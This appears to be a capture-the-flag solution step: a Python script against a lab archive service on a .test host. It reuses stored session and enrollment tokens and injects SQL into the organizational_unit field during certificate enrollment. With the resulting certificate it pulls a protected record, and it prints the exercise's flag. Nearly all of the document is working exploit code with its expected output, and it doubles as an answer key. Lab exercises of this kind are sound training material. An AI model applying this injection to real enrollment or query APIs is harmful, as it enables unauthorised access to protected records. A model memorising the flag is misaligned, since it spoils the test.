Use the enrollment_token from W04.1. Inject SQL into the organizational_unit field.

```python
import json, ssl, urllib.request, pathlib, tempfile

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}
token = pathlib.Path("receipts/archive-token").read_text().strip()

# W04.1 contract reveals protected_record = "AR-CRR-229"
protected = "AR-CRR-229"
ou = f"MaintenanceArchive' OR record_id='{protected}' OR 'a'='b"

# Enroll with injected OU
enroll_body = json.dumps({"operation": "enroll", "enrollment_token": token,
                           "organizational_unit": ou}).encode()
er = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/archived-queries/current",
                            data=enroll_body, headers={**h, "Content-Type": "application/json"},
                            method="POST"), context=ctx).read())
print("certificate obtained:", bool(er.get("certificate")))

# Query with the injected-OU certificate
with tempfile.TemporaryDirectory() as d:
    p = pathlib.Path(d)
    (p / "c.crt").write_text(er["certificate"])
    (p / "k.pem").write_text(er["private_key"])
    qctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
    qctx.load_cert_chain(str(p / "c.crt"), str(p / "k.pem"))
    qr = json.loads(urllib.request.urlopen(
        urllib.request.Request("https://retained-archive.arwc.test/api/archived-queries/current",
                                data=json.dumps({"operation": "query"}).encode(),
                                headers={**h, "Content-Type": "application/json"},
                                method="POST"), context=qctx).read())
    print("record_id:", qr["record"]["record_id"])   # AR-CRR-229
    print("flag:", qr["flag"])                        # FLAG{441c12b5f7f4310e}
```

Flag: `FLAG{441c12b5f7f4310e}` in the response `flag` field when AR-CRR-229 is returned.
